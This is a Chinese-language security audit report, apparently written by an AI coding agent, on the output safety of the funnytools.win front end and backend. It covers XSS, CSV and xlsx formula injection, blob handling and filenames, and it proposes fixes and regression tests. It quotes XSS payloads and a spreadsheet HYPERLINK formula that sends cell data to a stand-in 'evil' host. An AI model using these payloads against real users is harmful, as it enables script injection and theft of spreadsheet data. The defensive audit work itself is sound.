---
title: funnytools.win 前端輸出安全稽核（任務書 §12）
date: 2026-09-07
branch: claude/task-02-funnytools-reliability
scope: 只稽核與寫測試，未修改 src/ backend/ .github/
---

# funnytools.win 前端輸出安全稽核

## 0. 稽核範圍與環境限制（先讀）

**本輪只做稽核與寫回歸測試，沒有修改任何 `src/`、`backend/`、`.github/` 檔案。**

| 項目 | 狀態 |
|------|------|
| 證據來源 | 原始碼（`src/`、`backend/`）＋ 本機 `npm run build` 產物（`dist/`，1171 頁，建置成功） |
| 線上驗證 | **未做，也不得宣稱做過**。對外網路封鎖 `funnytools.win` 與 `api.funnytools.win`（proxy 403） |
| 瀏覽器實測 | **未做**。本環境沒有瀏覽器，凡是「瀏覽器實際行為」的結論一律標記為無法驗證 |
| 可執行驗證 | `npm run build`、`node --test`、`marked` / `papaparse` / `dompurify` 原始碼與行為、`openpyxl` 3.1.5 實測 |

`openpyxl` 原本不在本機環境，為了驗證後端 xlsx 行為而用 `pip install openpyxl` 裝進系統 Python，
**沒有動到 `backend/requirements.txt`**，也沒有修改任何後端檔案。

---

## 1. 結論摘要

掃描 `src/` 全部 36 處 `innerHTML`、29 處 `URL.createObjectURL`、32 處 `.href =` 指派、13 個會用使用者檔名組下載檔名的工具、
6 個 CSV/XLSX 輸出路徑，以及 5 個上傳型工具的 API client。

### 真實可利用（有明確入口，P1 × 2）

| # | 位置 | 一句話 |
|---|------|--------|
| A | `src/components/tools/DataConverter.astro:21,105` | 英文／中文的 `json-to-csv` 完全沒有公式逸出，貼進去的 `=`／`+`／`-`／`@` 原樣寫進 CSV |
| B | `backend/services/pdf_table.py:228` | `=` 開頭的表格儲存格被 openpyxl 寫成**真正的 Excel 公式**（已實測出 `<f>` 節點） |

### 理論上不佳但目前沒有實際入口（P2 × 7）

C 前端 object URL 洩漏、D 單一工具檔名未清洗、E JSON-LD 缺 `</script>` 逸出層、
F 六處 blob 立即 revoke 的可靠度疑慮、G `GradeAverage` CSV 無前綴防護（但資料全是數字）、
H markdown 匯出的 innerHTML round-trip、I 下載 blob 的 MIME 繼承自後端 header。

### 確認安全，請勿誤判為風險

- 36 處 `innerHTML` 裡，**沒有任何一處**把使用者輸入未逸出地拼進 HTML。
- `MarkdownPreviewer` 的 DOMPurify 消毒是有效的（已用安裝版原始碼驗證 URI 政策）。
- QR code、條碼、URL 編碼工具**沒有**把使用者輸入放進 `href`／`src`。
- 四個名單類 CSV 工具**已經有**公式前綴防護。
- 13 個工具裡 12 個**已經有**檔名清洗。
- 第 7 項（後端檔名與 header）**現況設計是正確的**——前端根本不讀 `Content-Disposition`。
- 全站沒有 `outerHTML`、`insertAdjacentHTML`、`eval`、`new Function`、`srcdoc`、
  `document.write`、`window.open`、`location.href =`。

---

## 2. 逐項稽核

### §1 `innerHTML` / `outerHTML` / `insertAdjacentHTML`

**`outerHTML` 0 處，`insertAdjacentHTML` 0 處，`innerHTML` 36 處。**

36 處的完整分類（可用 `grep -rn "innerHTML" src/` 復現）：

| 類別 | 數量 | 判定 |
|------|------|------|
| `innerHTML = ''`（清空容器） | 18 | 安全，不是注入點 |
| 讀取 `preview.innerHTML`（`MarkdownPreviewer.astro:36,48`） | 2 | 見 §2 |
| 內插只有建置期 i18n `labels.*` | 8 | 安全 |
| 內插經 `esc()` 逸出的使用者文字 | 2 | 安全 |
| 內插只有 `toFixed()`／`format()` 後的數字 | 4 | 安全 |
| `DOMPurify.sanitize(...)` | 1 | 安全，見 §2 |
| 靜態字串 `'<strong></strong>'` | 1 | 安全 |

**逐一交代重點處（這些是安全的，寫出來是為了讓你不必再查一次）：**

- `src/components/tools/SpssResultInterpreter.astro:131`
  ```js
  output.innerHTML = parts.map((part) => `<div><h3>${esc(part.title)}</h3><p>${esc(part.body)}</p></div>`).join('');
  ```
  `part.title` / `part.body` 確實來自使用者貼上的 SPSS 報表文字，但 `:100` 定義的
  `esc()` 逸出了 `& < > " '` 五個字元，**且該行每個 `${}` 都包在 `esc()` 裡**。安全。
- `src/components/tools/Apa7ReportGenerator.astro:129` — 同樣模式，`esc()` 定義在 `:83`。安全。
- `src/components/tools/GpaCalculator.astro:129`、`GradeAverage.astro:98`、
  `EducationStatisticsCalculator.astro:169`：這三處長得最像 attribute injection
  （`value="${course}"`、`value="${score}"`、`value="${value}"`），但追過所有呼叫端後
  確認**只會被字面常數呼叫**：
  - `GpaCalculator` `createRow()` 呼叫點：`:148`、`:183`、`:200-202`（`''`／`'3'`／`'A'`）
  - `GradeAverage` `createRow()` 呼叫點：`:112`、`:146`、`:172-174`（`'90'`／`'85'`／`''`）
  - `EducationStatisticsCalculator` `addWeightedRow()` 呼叫點：`:368`、`:403`（`'80'`／`'30'`）

  這三個工具**沒有** `localStorage`、`sessionStorage`、`searchParams`、`location.hash`
  任何還原路徑（全站只有 `PomodoroTimer.astro` 用 `localStorage`），所以使用者打進輸入框的字
  永遠不會再回流到這些 template。安全，但屬於「一次重構就會變成漏洞」的脆弱寫法。
- `SeatingChart.astro:221`、`ClassGroupGenerator.astro:198` 等名單類工具的學生姓名
  一律走 `element.textContent = name`，`innerHTML` 只用來清空或塞
  `<p class="empty-state">${labels.emptyResult}</p>`。安全。
- `src/lib/downloadGate.client.ts:192` `title.innerHTML = '<strong></strong>'`
  後面立刻 `(title.firstChild).textContent = labels.title`。這是刻意寫成安全的樣子。安全。

**補充發現（不在任務書七項內，但屬於同一個輸出面）：`set:html` 的 JSON-LD**

`src/components/Faq.astro:39`：
```astro
{emitJsonLd && <script type="application/ld+json" set:html={JSON.stringify(faqJsonLd)} />}
```
`src/layouts/BaseLayout.astro:147` 也是同樣寫法。

- **現況**：`JSON.stringify` 不逸出 `<`，Astro 的 `set:html` 也不逸出。建置產物中
  已經有 **21 個 ld+json 區塊含有字面 `<`**（例：
  `dist/en/guides/spss-levene-test-guide/index.html` 的 `"text":"...p < .05..."`），
  **0 個**含有 `\u003c` 逸出形式。
- **失效情境**：任何 FAQ 問答、指南描述、工具文案只要含有字面 `</script>`，該 `<script>`
  元素就會提前結束，剩下的 JSON 字串會被瀏覽器當成 HTML 解析並注入頁面。
  這不是假設題——`src/i18n/tools/content-enhancements.ts:269-270` 就已經在內容字串裡寫了
  `<script>alert(1)</script>`（那是 Markdown 預覽器的教學文案）。它目前只流向頁面正文
  （會被 Astro 正常逸出成 `&lt;script&gt;`），沒有流進 JSON-LD 欄位，所以**今天沒有破**。
- **風險評級**：**P2（無實際入口）**，但這是 P2 裡最該優先修的一個。
  公司每週由 `fable-web-toolsmith` 新增工具與文案，一次 FAQ 文案編輯就可能把它變成 P0。
- **建議修法**：在 `Faq.astro` 與 `BaseLayout.astro` 包一層逸出，例如
  `JSON.stringify(x).replace(/</g, '\\u003c')`（`\u003c` 在 JSON 字串裡與 `<` 等價，
  不影響 Google 解析 JSON-LD）。
- **已加護欄**：測試 §附 會掃描全部 1171 頁、2477 個 ld+json 區塊，任何一塊解析失敗或
  含有 `</script` 就紅燈。目前綠燈。

---

### §2 `DOMPurify` / `marked`

唯一的 markdown → HTML 路徑是 `src/components/tools/MarkdownPreviewer.astro`
（其他檔案裡的 `marked`／`DOMPurify` 字樣全都是文章內容或 i18n 文案，不是程式路徑）。

`src/components/tools/MarkdownPreviewer.astro:24`：
```js
preview.innerHTML=DOMPurify.sanitize(marked.parse(input.value,{async:false}));
```

**判定：安全。** 依據如下，全部可在本機復現：

1. **`marked` 本身完全不過濾**（實測 `marked@18.0.5`）：
   ```
   [c](javascript:alert(1))          → <p><a href="javascript:alert(1)">c</a></p>
   <img src=x onerror=alert(1)>      → <img src=x onerror=alert(1)>
   <svg><script>alert(1)</script>    → <p><svg><script>alert(1)</script></svg></p>
   ```
   也就是說 **DOMPurify 是唯一防線**，這條路徑不能有任何旁路。
2. **`DOMPurify@3.4.11` 用的是預設設定**（`sanitize()` 沒有帶第二個參數），
   原始碼 `node_modules/dompurify/dist/purify.cjs.js:325` 的預設 URI 政策：
   ```
   /^(?:(?:(?:f|ht)tps?|mailto|tel|callto|sms|cid|xmpp|matrix):|[^a-z]|[a-z+.\-]+(?:[^a-z+.\-:]|$))/i
   ```
   實測結果：`javascript:` ✗、`JaVaScRiPt:` ✗、`vbscript:` ✗、`data:text/html;base64,...` ✗；
   `https:` ✓、`mailto:` ✓、相對路徑 ✓、`#fragment` ✓。
3. **`data:` 繞道也不成立**：`:680` 的 `DEFAULT_DATA_URI_TAGS` 只有
   `['audio','video','img','source','image','track']`，**不含 `a`**，
   所以 `<a href="data:text/html,...">` 的 href 會被剝掉。
   `<img src="data:text/html,...">` 雖然允許，但 `img` 載入 HTML 資料只會載入失敗，不會執行。
4. **SVG 繞道**：DOMPurify 預設會處理 SVG 命名空間並移除其中的 `<script>`／事件屬性；
   本站沒有 `ADD_TAGS`／`ADD_ATTR`／`ALLOW_UNKNOWN_PROTOCOLS`／`ALLOWED_URI_REGEXP`
   任何放寬設定（已用測試釘住）。
5. **額外緩解**：`:33-35` 攔截預覽區內 `<a>` 的點擊並 `preventDefault()`。

**下載路徑（`:37-53`）也安全**：`documentHtml` 內插的是 `${preview.innerHTML}`，
也就是「消毒後 DOM 的序列化結果」，不是 `input.value` 原文；`<title>` 用的
`labels.documentTitle` 是建置期字串且再 `.replace(/[<>&"']/g,'')` 一次。

**唯一保留意見（H，P2，理論面）**：
- **現況**：消毒 → 字串 → `innerHTML` 重新解析 → 再讀 `.innerHTML` 重新序列化 → 寫進下載檔。
- **失效情境**：這種 sanitize-serialize-reparse 的來回是 mXSS（mutation XSS）的典型溫床。
  DOMPurify 3.x 已針對此類做了大量防禦，且下載檔一定帶 `download` 屬性（瀏覽器會存檔而非內嵌執行），
  所以**目前找不到可利用路徑**。
- **風險評級**：**P2（理論面）**。
- **建議修法**：若要收斂，改用 `DOMPurify.sanitize(md, { RETURN_DOM_FRAGMENT: true })`
  並以 DOM 節點插入，下載時對 `preview.innerHTML` 再 sanitize 一次。
- **無法驗證**：本環境沒有 jsdom／瀏覽器，無法實際跑 `DOMPurify.sanitize()`。
  上述結論來自安裝版原始碼與設定，不是執行結果。

---

### §3 URL 處理（`href` / `src` 是否可能被塞入 `javascript:`、`data:text/html`）

**判定：全部安全，沒有任何一處把使用者輸入放進連結。**

掃描 `src/components/`、`src/lib/` 全部 32 處 `.href =` 指派（`grep -rEo '(anchor|link|a)\.href\s*=' src/components src/lib | wc -l`），來源只有四種：

| 來源 | 例子 | 判定 |
|------|------|------|
| `URL.createObjectURL(blob)` 產生的 `blob:` | `MergePdf.astro:265`、`funnytools-api.ts:256` | 安全 |
| `canvas.toDataURL('image/png')` | `QrCodeGenerator.astro:187`、`ChartMaker.astro:284`、`Sketchpad.astro:219`、`FlowchartMaker.astro:448`、`Cad2dBoard.astro:1439` | 安全，MIME 固定 png |
| 本地產生的 `item.url`（同樣是 blob） | `SplitPdf.astro:181` | 安全 |
| 本地變數 `outputUrl` | `ImageCompressor.astro:289` 等 | 安全 |

逐項確認任務書點名的工具：

- **QR code（`QrCodeGenerator.astro`）**：使用者輸入的 `value` 只走
  `QRCode.toCanvas(canvas, value, ...)`（`:167`），**只畫進 canvas，從不進 DOM 屬性**。
  下載連結是 `canvas.toDataURL('image/png')`（`:187`），檔名固定 `'qr-code.png'`。
  上傳的 logo 走 `FileReader.readAsDataURL`（`:225`）再 `image.src = reader.result`，
  是圖片資料 URL，不是 HTML。安全。
  （註：QR 碼「內容」本身當然可以編碼成 `javascript:` 字串，但那是掃碼端的事，
  也正是 QR 產生器的正常功能，不算本站的輸出漏洞。）
- **條碼（`BarcodeGenerator.astro`）**：SVG 匯出用
  `new XMLSerializer().serializeToString(preview)`（`:201`），序列化 live DOM 會自動逸出
  `<`、`&`，不是字串拼接。安全。
- **URL 編碼（`UrlEncoder.astro`）**：整支檔案沒有任何 `href`、`innerHTML`、`location`。安全。
- **全站沒有**：`javascript:`、`data:text/html`、`eval(`、`new Function(`、`srcdoc`、
  `document.write(`、`window.open(`、`location.href =`、`location.assign`。

---

### §4 CSV / 試算表公式注入

#### A. `json-to-csv` 英文／中文頁沒有公式逸出 — **P1，真實可利用**

- **位置**：`src/components/tools/DataConverter.astro:21` 與 `:105`
- **現況**：
  ```astro
  <!-- :7  整個區塊被 labels.delimiterLabel 包住 -->
  {labels.delimiterLabel && (
    ...
    <!-- :21 -->
    {labels.escapeFormulaeLabel && <label><input data-escape-formulae type="checkbox" checked /> ...</label>}
  )}
  ```
  ```js
  // :105
  escapeFormulae: root.querySelector('[data-escape-formulae]')?.checked || false,
  ```
  `delimiterLabel` 與 `escapeFormulaeLabel` **只定義在 `src/i18n/expansion/es-tools-14.ts:369`
  與 `fr-tools-14.ts:315`**（`grep -rln "delimiterLabel" src/` 只有這兩個 i18n 檔加元件本身）。
  英文與中文的 label 來源 `src/i18n/tools/new-utility-tools.ts:46` 沒有這兩個 key，
  所以整個選項區塊根本不渲染 → `querySelector` 回傳 `null` → `?.checked` 是 `undefined`
  → `|| false` → **`escapeFormulae: false`**。

- **建置產物證據**（`npm run build` 後）：

  | 頁面 | `data-escape-formulae` 出現次數 |
  |------|------|
  | `dist/tools/json-to-csv/index.html` | **0** |
  | `dist/en/tools/json-to-csv/index.html` | **0** |
  | `dist/zh/tools/json-to-csv/index.html` | **0** |
  | `dist/es/herramientas/convertir-json-a-csv/index.html` | 1 |
  | `dist/fr/outils/convertir-json-en-csv/index.html` | 1 |

- **實測 papaparse 5.5.3 行為差異**：
  ```
  escapeFormulae:false → "name,note\r\n=1+1,@SUM(A1)\r\n+1,-1"      ← 原樣輸出
  escapeFormulae:true  → "name,note\r\n\"'=1+1\",\"'@SUM(A1)\"..."  ← 加上 ' 前綴
  ```

- **攻擊／失效情境**：`json-to-csv` 的正常用途就是「把別處拿到的 JSON 轉成 CSV」，
  來源天然不可信（API 回應、匯出檔、同事給的檔案）。攻擊者只要讓受害者轉換一份含
  `{"note":"=HYPERLINK(\"http://evil/?d=\"&A1,\"報表\")"}` 的 JSON，受害者下載 CSV
  並用 Excel／Google Sheets 開啟，儲存格就會變成可點的外連公式，
  或以 `=WEBSERVICE(...)`／DDE 形式嘗試外洩同表資料。
  這是 CWE-1236（Formula Injection），且**主力語系（英文／中文）完全沒有防護**。

- **風險評級**：**P1**
- **建議修法**：把 `escapeFormulae` 與 label 是否存在**脫鉤**，預設開啟：
  ```js
  const escapeControl = root.querySelector('[data-escape-formulae]');
  escapeFormulae: escapeControl ? escapeControl.checked : true,
  ```
  （只改 `:105` 一行即可讓三個語系立刻有防護，es／fr 的既有 checkbox 行為不變。）

#### B. 後端 `tables_to_xlsx` 把 `=` 寫成真正的 Excel 公式 — **P1，真實可利用**

- **位置**：`backend/services/pdf_table.py:228`
- **現況**：
  ```python
  ws.cell(r, c, "" if value is None else str(value))
  ```
- **實測（openpyxl 3.1.5，本機執行，未修改 backend）**：

  | 輸入 | `data_type` | 結果 |
  |------|------|------|
  | `=1+1` | `'f'` | **FORMULA** |
  | `=HYPERLINK("http://evil.example/?x="&A1,"click")` | `'f'` | **FORMULA** |
  | `+1+1` / `-1+1` / `@SUM(1)` / `\t=1+1` / `'=1+1` | `'s'` | text |

  產出的 `xl/worksheets/sheet1.xml` 裡確實出現 `<f>` 節點：
  ```xml
  <c r="A1"><f>1+1</f><v /></c>
  <c r="A2"><f>HYPERLINK("http://evil.example/?x="&amp;A1,"click")</f><v /></c>
  ```
  成因是 openpyxl `Cell._bind_value`：字串長度 > 1 且以 `=` 開頭時，`data_type` 會被設成 `'f'`。

- **攻擊／失效情境**：兩條入口。
  1. **惡意 PDF**：`/api/pdf/table-to-excel` 會把 PDF 抽出的表格文字直接寫進 xlsx。
     PDF 是攻擊者可完全控制的內容。
  2. **直接打 API**：`/api/pdf/export-tables`（`backend/app.py:288`）收的是
     **前端送來的 JSON**（`funnytools-api.ts:190-196` 的 `exportEditedTables`），
     不需要 PDF 就能塞任意字串。

  受害者用 Excel 開啟 xlsx 時，`=` 儲存格是真公式而非文字，`HYPERLINK`／`WEBSERVICE`
  之類的外連公式可用來做資料外洩或釣魚導流。

- **和 CSV 的差別（避免過度標記）**：xlsx 只有 `=` 有問題；`+`、`-`、`@`、Tab、CR
  在 openpyxl 下都是純字串，Excel 讀 xlsx 的 string cell **不會**重新當公式解析。
  這與 CSV 不同（CSV 是純文字，Excel 匯入時 `= + - @ Tab CR` 全部危險）。

- **風險評級**：**P1**
- **建議修法（本輪不做，僅稽核）**：寫入前中和，例如
  ```python
  text = "" if value is None else str(value)
  if text.startswith("="):
      text = "'" + text
  ws.cell(r, c, text)
  ```
  或明確 `cell = ws.cell(r, c); cell.value = text; cell.data_type = "s"`。

#### C. 四個名單類 CSV 工具 — **安全，請勿誤判**

`SeatingChart.astro:133`、`RandomStudentPicker.astro:91`、`ClassGroupGenerator.astro:123`
會把使用者貼上的姓名寫進 CSV，三者都有前綴防護（連全形 `＝＋－＠` 都擋）：
```js
const protectedText = /^[=+\-@\t\r\n\uFF1D\uFF0B\uFF0D\uFF20]/.test(text) ? `\t${text}` : text;
return `"${protectedText.replace(/"/g, '""')}"`;
```
`RandomGroupGenerator.astro:79` 用 `'` 前綴，同樣有效。**這四個是對的，不需要動。**

#### D. `GradeAverage.astro:69` 沒有前綴防護 — **P2，無實際入口**

- **現況**：
  ```js
  function csvCell(value) {
    const text = String(value ?? '');
    return /[",\r\n]/.test(text) ? `"${text.replace(/"/g, '""')}"` : text;   // 沒有 = + - @ 前綴防護
  }
  ```
- **為什麼目前不可利用**：追過 `:165-169` 的所有 `rows.push()`，寫進 CSV 的只有
  `format(row.score)`（`toFixed(2)`）、`format(row.weight)`、建置期 `labels.*`、
  以及 `outputs.average.textContent`（同樣是 `toFixed(2)` 產物）。
  **沒有任何自由文字欄位**，負數如 `-5.00` 在 Excel 是數值不是公式。
- **風險評級**：**P2（防禦縱深）**。列出來是因為它與同專案另外四個工具的寫法不一致，
  日後若有人在這個 CSV 加一欄「科目名稱」就會立刻變成真漏洞。
- **建議修法**：把四個名單工具已驗證的 `csvCell` 抽成共用 helper，六個 CSV 工具統一使用。

---

### §5 Blob / data URL

#### C. `ConversionApiTool` 的校正圖 object URL 從未 revoke — **P2，真實但只影響記憶體**

- **位置**：`src/components/tools/ConversionApiTool.astro:332`
- **現況**：
  ```js
  fileInput?.addEventListener('change', () => { if (mode !== 'image-to-dxf') return; ...
    calibrationImage = new Image(); ... calibrationImage.src = URL.createObjectURL(file); });
  ```
  整支 `ConversionApiTool.astro` 的 `URL.revokeObjectURL` 出現次數是 **0**。
  `clear()`（`:210`）只把 `calibrationImage = null`，不 revoke。
- **失效情境**：`image-to-dxf` 使用者每換一張校正圖，就多洩漏一份完整影像的記憶體，
  直到分頁關閉才釋放。連續調整參數、反覆換圖是這個工具的正常用法，
  大圖 × 多次 = 分頁記憶體膨脹，行動裝置可能被系統終止分頁。
- **風險評級**：**P2**（可用性／穩定度，不是安全洩漏——blob URL 只在同源分頁內有效）
- **建議修法**：模組層留一個 `calibrationUrl`，指派新的之前先
  `URL.revokeObjectURL(calibrationUrl)`，並在 `clear()` 與 `beforeunload` 各 revoke 一次。

#### 其餘 createObjectURL 的收尾狀況 — **大致良好**

`src/components/` 與 `src/lib/` 共 29 處 `URL.createObjectURL`、29 處 `URL.revokeObjectURL`（總數相同純屬巧合——`ConversionApiTool` 少一個 revoke，其他元件多一個）：
- 有 `beforeunload` 全域收尾的 9 個元件：`ImageCompressor`、`SplitPdf`、`JpgToPng`、
  `ImageRotateFlip`、`PdfCompressor`、`ImageFormatConverter`、`PngToJpg`、`PdfToImage`、`ImageResizer`。
- 用 `setTimeout(() => URL.revokeObjectURL(url), 1000)` 的約 12 處，這是安全寫法。
- `SplitPdf` 的多檔輸出用 `revokeOutputs()` 在 `:263`、`:282`、`:312` 與 `beforeunload`（`:329`）
  四個點收尾，覆蓋完整。

#### F. 六處在 `click()` 之後**同步**立即 revoke — **P2，無法驗證**

`GradeAverage.astro:82`、`SeatingChart.astro:147`、`RandomStudentPicker.astro:105`、
`ClassGroupGenerator.astro:137`、`RandomGroupGenerator.astro:93`、`ImageCrop.astro:269`
的寫法是：
```js
anchor.click();
URL.revokeObjectURL(url);   // 同一個 tick，沒有 setTimeout
```
- **疑慮**：同專案其他 12 處都刻意用 `setTimeout(..., 1000)`，這六處沒有；
  而且這六處都沒有把 anchor 掛進 `document.body`（`funnytools-api.ts:258` 有掛）。
  歷史上 Firefox／Safari 在 `click()` 後立即 revoke 會讓下載失敗。
- **風險評級**：**P2（可靠度，非安全）**
- **無法驗證**：本環境沒有瀏覽器，也不能連線上驗證，**無法確認實際是否會下載失敗**。
  這裡只指出「與專案自身的其他 12 處寫法不一致」這個客觀事實。
- **建議修法**：統一走一個共用 `downloadBlob()`（`src/lib/funnytools-api.ts:253` 已經有一個
  正確版本：appendChild → click → remove → `setTimeout` revoke）。

#### 下載 blob 的 MIME 型別

全站產生的 blob MIME 只有：`application/pdf`、`application/json`、`text/csv`、`text/plain`、
`image/png`、`image/svg+xml`（2 處）、`text/html`（1 處）。

- `text/html`（`MarkdownPreviewer.astro:51`）：內容是 DOMPurify 消毒後結果，且帶 `download` 屬性
  （瀏覽器會存檔，不會內嵌渲染）。安全。
- `image/svg+xml`（`Cad2dBoard.astro:1483`、`BarcodeGenerator.astro:202`）：
  `Cad2dBoard` 的 SVG 只由數值座標拼成（`svgShape()` `:1444-1461` 全是 `.x` `.y` `.r` 數字，
  無使用者字串）；`BarcodeGenerator` 用 `XMLSerializer` 序列化 live DOM。兩者安全。

#### I. 後端回傳的 blob MIME 未被前端限制 — **P2，理論面**

`src/lib/funnytools-api.ts:271` 的 `return res.blob()` 讓 Blob 的 `type` 直接繼承回應的
`Content-Type`。目前後端（`backend/app.py:165,195,265,287,326,349`）只回
`application/zip`、`.docx`、`.xlsx`、`application/dxf`、`application/pdf` 五種二進位型別，
**沒有 `text/html` 或 `image/svg+xml`**，而且 `downloadBlob()` 一定設 `a.download`，
所以就算後端被改壞也是存檔而非內嵌執行。**目前不可利用**，列出僅為記錄前端沒有做型別斷言這件事。

---

### §6 檔名處理

13 個工具會把使用者提供的 `file.name` 組進下載檔名。

**12 個有清洗（安全）**：`ImageCompressor:158`、`ImageCrop:103`、`ImageResizer:167`、
`ImageRotateFlip:117`、`JpgToPng:120`、`PngToJpg:146`（`fileBaseName`）；
`ImagesToPdf:173`、`MergePdf:152`、`SplitPdf:155`、`RotatePdf:113`、`DeletePdfPages:72`、
`ExtractPdfPages:72`（`safeBaseName`）。清洗規則一致：
```js
name.replace(/\.[^.]+$/, '').replace(/[^\w-]+/g, '-').replace(/^-|-$/g, '') || 'image';
```
`[^\w-]+ → '-'` 會把 `/`、`\`、`..`、控制字元、換行全部換掉。安全。

#### D. `ImageFormatConverter` 是唯一沒清洗的 — **P2，防禦縱深**

- **位置**：`src/components/tools/ImageFormatConverter.astro:15`（該檔 script 壓成一行）
- **現況**：
  ```js
  fileName=`${file.name.replace(/\.[^.]+$/,'')}.${labels.extension}`;
  ...
  a.download=fileName;
  ```
  **只砍副檔名，沒有做任何字元過濾**——與同專案其他 12 個工具的處理方式不一致。
- **失效情境**：使用者上傳的檔名若含 `/`、`\`、`..`、控制字元或超長字串，會原樣進到
  `download` 屬性。現代瀏覽器規範要求對 `download` 屬性值做路徑清洗
  （去除路徑分隔符），因此**實務上不構成路徑穿越**。
- **風險評級**：**P2**（依賴瀏覽器清洗＝把安全責任外包出去；且不一致的寫法容易被複製到新工具）
- **無法驗證**：沒有瀏覽器可實測各家 `download` 屬性清洗行為，上述判斷來自規範而非實測。
- **建議修法**：抽出共用的 `safeBaseName()`（12 個工具已各自複製一份），
  `ImageFormatConverter` 改用它，並加上長度上限（目前 12 個安全版本也**沒有**長度上限，
  512 字元的檔名會原樣通過——建議一併加 `.slice(0, 100)`）。

---

### §7 後端提供的檔名與 header — **安全，現況設計正確**

任務書擔心「前端直接信任後端給的檔名」。**實際情況比擔心的好：前端根本不讀。**

- **`src/lib/funnytools-api.ts` 完全沒有 `Content-Disposition` 字樣。**
  `fetchBlob()`（`:268-272`）只做 `res.blob()`，不碰任何檔名 header。
- 整支 API client **只讀一個 header**：`res.headers.get("X-Funnytools-Stats")`（`:279`），
  而且 `parseBatchCompressionStats()`（`:283-305`）用
  `Number.isSafeInteger` + `>= 0` 逐欄驗證，`JSON.parse` 包在 try/catch 裡，
  壞掉的 header 只會讓統計顯示不出來，不會中斷下載。這是正確寫法。
- **檔名全部是前端字面常數**：`ConversionApiTool.astro` 的
  `outputName` 起始值 `'converted-file'`（`:162`），之後只會被指派成
  `'compressed-images.zip'`、`'converted.docx'`、`'vectorized.dxf'`、`'compressed.pdf'`、
  `'edited-pdf-tables.xlsx'` 五個常數（`:337,340,346,349,353`）。
- 後端那邊（`backend/app.py`）輸出的也是同樣的伺服器常數檔名，
  且 `expose_headers` 有列 `Content-Disposition`（`:52`）——但既然前端不讀，
  這條 CORS 設定目前不構成風險面。

**已加護欄**：測試 §7 兩則會在 `funnytools-api.ts` 出現 `Content-Disposition`、
或 `outputName` 被指派成非常數時立刻紅燈。

---

## 3. 風險總表

| # | 位置 | 問題 | 可利用性 | 評級 |
|---|------|------|----------|------|
| A | `DataConverter.astro:21,105` | 英/中 json-to-csv 無公式逸出 | **有實際入口** | **P1** |
| B | `backend/services/pdf_table.py:228` | `=` 寫成真 Excel 公式 | **有實際入口**（惡意 PDF／直接打 API） | **P1** |
| E | `Faq.astro:39`、`BaseLayout.astro:147` | JSON-LD 缺 `</script>` 逸出 | 無現行入口，一次文案編輯即成立 | P2 |
| C | `ConversionApiTool.astro:332` | object URL 從未 revoke | 真實（記憶體，非安全） | P2 |
| D | `ImageFormatConverter.astro:15` | 檔名未清洗 | 靠瀏覽器兜底 | P2 |
| F | 6 處（`GradeAverage:82` 等） | click() 後同步 revoke | 無法驗證 | P2 |
| G | `GradeAverage.astro:69` | csvCell 無前綴防護 | 目前只有數字，無入口 | P2 |
| H | `MarkdownPreviewer.astro:24,48` | innerHTML round-trip | 理論面 mXSS | P2 |
| I | `funnytools-api.ts:271` | blob MIME 繼承後端 header | 後端目前只回二進位型別 | P2 |

**P0：0 個。** 沒有找到任何可直接執行任意 JavaScript 的路徑。

## 4. 建議的修法順序（由你統一派工，本輪未執行）

1. **A**（改 1 行，`DataConverter.astro:105`）——影響主力語系，投入產出比最高。
2. **B**（改 3 行，`pdf_table.py`）——後端，需走 backend 的驗證流程。
3. **E**（改 2 行，`Faq.astro` / `BaseLayout.astro`）——擋住週更文案的長期風險。
4. **C / D / G**（可合併成一次「共用 helper 抽取」重構：`safeBaseName`、`csvCell`、`downloadBlob`）。
5. **F / H / I**——需要瀏覽器實測才值得動，建議等有線上驗證能力時再評估。

## 5. 回歸測試

`tests/output-safety.test.mjs`，20 則，**16 綠 4 紅**。
四則紅燈對應 A、B、C、D 四個確認的缺口，**必須維持紅燈直到修好**，
不得以放寬斷言或 skip 的方式轉綠。實際執行輸出見
`reports/task-02-reliability/output-safety-test-run.md`。
